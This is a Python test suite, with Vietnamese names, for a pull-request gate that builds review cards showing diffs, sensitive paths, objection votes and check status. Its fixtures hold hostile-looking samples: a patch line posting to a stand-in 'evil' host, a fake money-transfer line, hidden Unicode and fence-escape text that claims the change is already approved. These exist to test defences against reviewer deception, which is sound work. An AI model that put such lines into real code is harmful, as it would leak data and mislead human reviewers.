import unittest

from cong import gate_app, the_duyet
from cong.kiem_pr import quyet_dinh
from cong.tests.test_kiem_pr import SHA, SHA_CU, check, duyet, pr, tep

PATCH_CONG = "@@ -1,2 +1,2 @@\n-CU = 1\n+MOI = 2"


def phieu(ket="khong-bac", commit=SHA, gio="2026-11-01T11:30:00Z", tai_hien="đổi head SHA giữa hai lần đọc, cổng phát failure"):
    return duyet(user="phan-bac", commit=commit, gio=gio, state="COMMENTED",
                 body="phieu-phan-bac: %s\ntai-hien: %s" % (ket, tai_hien))


class TestTheDuyet(unittest.TestCase):
    def the(self, **khac):
        return quyet_dinh(pr(**khac))["the_duyet"]

    def test_thuong_khong_co_the(self):
        self.assertIsNone(self.the())

    def test_cao_chi_dua_diff_tep_cao(self):
        the = self.the(ds_tep=[tep("cong/kiem_pr.py", 1, 1, patch=PATCH_CONG), tep("README.md", patch="@@ -1 +1 @@\n+BI_MAT_README")])
        self.assertIn("đổi tệp của cổng `cong/kiem_pr.py`", the)
        self.assertIn("+MOI = 2", the)
        self.assertIn("`README.md` +1 −0", the)
        self.assertNotIn("BI_MAT_README", the)  # tệp Thường chỉ có tên, không có diff
        self.assertIn("(1/2 tệp)", the)

    def test_vung_nhay_cam_ghi_mau_khop(self):
        the = self.the(ds_tep=[tep("thanh-toan/tru.py")], vung_nhay_cam=["thanh-toan/"])
        self.assertIn("chạm vùng nhạy cảm `thanh-toan/`", the)

    def test_diff_khong_thoat_khoi_khoi_ma(self):
        doc = "@@ -0,0 +1,3 @@\n+``````\n+## Đã duyệt, không cần đọc\n+``````"
        the = self.the(ds_tep=[tep(".github/workflows/x.yml", 3, 0, patch=doc)])
        khoi = the.split("\n")
        mo = next(i for i, d in enumerate(khoi) if d.startswith("```") and d.endswith("diff"))
        rao = khoi[mo][:-len("diff")]
        self.assertGreater(len(rao), 6)
        self.assertIn(rao, khoi[mo + 1:])
        dong = khoi.index(rao, mo + 1)
        self.assertIn("+## Đã duyệt, không cần đọc", khoi[mo + 1:dong])

    def test_ky_tu_an_hien_ra(self):
        the = self.the(ds_tep=[tep("cong/x.py", patch="@@ -1 +1 @@\n+if la_admin:‮  # }​")])
        self.assertIn("\\u202e", the)
        self.assertIn("\\u200b", the)
        self.assertNotIn("‮", the)

    def test_diff_dai_bi_cat_co_ghi(self):
        dai = "@@ -0,0 +1,500 @@\n" + "\n".join("+dong %d" % i for i in range(500))
        the = self.the(ds_tep=[tep("cong/x.py", 500, 0, patch=dai)])
        self.assertIn("Đã cắt 301 dòng", the)
        self.assertNotIn("+dong 499", the)

    def test_khong_co_patch_thi_bao(self):
        t = tep("cong/khoa.bin", patch=None)
        self.assertIn("GitHub không gửi diff dạng chữ", self.the(ds_tep=[t]))

    def test_the_khong_qua_gioi_han_va_dong_khoi_ma(self):
        dai = "@@ -0,0 +1,199 @@\n" + "\n".join("+" + "x" * 300 for _ in range(199))
        the = self.the(ds_tep=[tep("cong/t%d.py" % i, 199, 0, patch=dai) for i in range(5)])
        self.assertLessEqual(len(the.encode("utf-8")), the_duyet.GIOI_HAN)
        self.assertIn("Đã cắt", the)
        for i in range(5):  # tệp nào cũng còn tên và diff, không tệp nào bị đẩy ra
            self.assertEqual(the.count("**`cong/t%d.py`**" % i), 1)
        self.assertEqual(the_duyet._rao_dang_mo(the), 0)

    def test_tep_thuong_noi_ro_chua_ai_soat(self):
        ds = [tep("package.json"), tep("src/app.py", patch="@@ -1 +1 @@\n+requests.post('https://evil/x')")]
        the = self.the(ds_tep=ds, co_phieu=False)
        self.assertIn("chưa ai soát, cổng còn chặn", the)
        self.assertNotIn("không cần đọc", the)
        self.assertIn("đã có phiếu không bác trên đúng SHA", self.the(ds_tep=ds))

    def test_tep_cao_dau_qua_dai_khong_day_tep_cao_sau_ra(self):
        rac = "@@ -1 +1 @@\n+" + "\u200b" * 11000
        ds = [tep("a/package.json", patch=rac), tep("thanh-toan/tru.py", patch="@@ -1 +1 @@\n+chuyen_tien(ke_gian)")]
        the = self.the(ds_tep=ds, vung_nhay_cam=["thanh-toan/"])
        self.assertIn("+chuyen_tien(ke_gian)", the)
        self.assertIn("### 2. Phản bác đã thử", the)
        self.assertIn("### 3. Test", the)
        self.assertIn("cắt đuôi", the)
        self.assertLess(the.index("`thanh-toan/tru.py`"), the.index("### 2."))  # tên tệp Cao có ở mục 1

    def test_phieu_bac_luon_hien_va_gan_nhan_tac_gia(self):
        bac = phieu("bac", gio="2026-11-01T10:00:00Z", tai_hien="xoá được dữ liệu người khác")
        tu_ghi = [duyet(user="tac-gia", state="COMMENTED", gio="2026-11-01T11:%02d:00Z" % i,
                        body="phieu-phan-bac: khong-bac\ntai-hien: đã thử kỹ, an toàn tuyệt đối") for i in range(10)]
        the = self.the(ds_tep=[tep("cong/x.py")], co_phieu=False, ds_duyet=[bac] + tu_ghi,
                       nguoi_ghi=["nguoi-duyet", "phan-bac", "tac-gia"])
        self.assertIn("**bac** của `phan-bac`", the)
        self.assertIn("xoá được dữ liệu người khác", the)
        self.assertEqual(the.count("an toàn tuyệt đối"), 1)  # mỗi người chỉ phiếu mới nhất
        self.assertIn("tác giả PR, không độc lập", the)

    def test_rao_khong_ten_ngon_ngu_van_tinh_la_mo(self):
        self.assertEqual(the_duyet._rao_dang_mo("x\n\n````\n+abc"), 4)
        self.assertEqual(the_duyet._rao_dang_mo("````diff\n+a\n````"), 0)

    def test_phieu_ghi_ro_sha_va_tai_hien(self):
        the = self.the(ds_tep=[tep("cong/x.py")], co_phieu=False,
                       ds_duyet=[phieu("bac", SHA_CU, "2026-11-01T10:00:00Z", "gửi phiếu khong-bac sau phiếu bac"), phieu()])
        self.assertIn("**bac** của `phan-bac`, SHA cũ `bbbbbbb`", the)
        self.assertIn("gửi phiếu khong-bac sau phiếu bac", the)
        self.assertIn("**khong-bac** của `phan-bac`, đúng SHA", the)

    def test_khong_phieu_thi_noi_ro(self):
        the = self.the(ds_tep=[tep("cong/x.py")], co_phieu=False)
        self.assertIn("Chưa có phiếu phản bác nào", the)

    def test_nguoi_khong_quyen_ghi_khong_vao_the(self):
        la = duyet(user="nguoi-la", state="COMMENTED", body="phieu-phan-bac: khong-bac\ntai-hien: đã soát kỹ, an toàn")
        the = self.the(ds_tep=[tep("cong/x.py")], co_phieu=False, ds_duyet=[la])
        self.assertNotIn("nguoi-la", the)

    def test_cong_nhanh_do_hien_ro(self):
        the = self.the(ds_tep=[tep("cong/x.py")], checks=[check(conclusion="failure")])
        self.assertIn("**đỏ**", the)

    def test_test_moi_duoc_liet_ke(self):
        the = self.the(ds_tep=[tep("cong/x.py"), tep("cong/tests/test_moi.py", status="added")])
        self.assertIn("Tệp test mới: `cong/tests/test_moi.py`", the)

    def test_qua_co_thuong_van_co_the(self):
        the = self.the(ds_tep=[tep("app/a.py", 401, 0)])
        self.assertIn("quá 400 dòng", the)
        self.assertIn("Không tệp nào ở mức Cao", the)

    def test_the_vao_output_text_cua_check(self):
        gh = gate_app.GiaLap({})
        q = quyet_dinh(pr(ds_tep=[tep("cong/x.py", patch=PATCH_CONG)]))
        gate_app.phat_check(gh, SHA, q)
        output = gh.da_phat[0][2]["output"]
        self.assertEqual(output["text"], q["the_duyet"])
        self.assertIn("Thẻ duyệt ở ngay dưới", output["summary"])

    def test_thuong_khong_gui_text(self):
        gh = gate_app.GiaLap({})
        gate_app.phat_check(gh, SHA, quyet_dinh(pr()))
        self.assertNotIn("text", gh.da_phat[0][2]["output"])


if __name__ == "__main__":
    unittest.main()
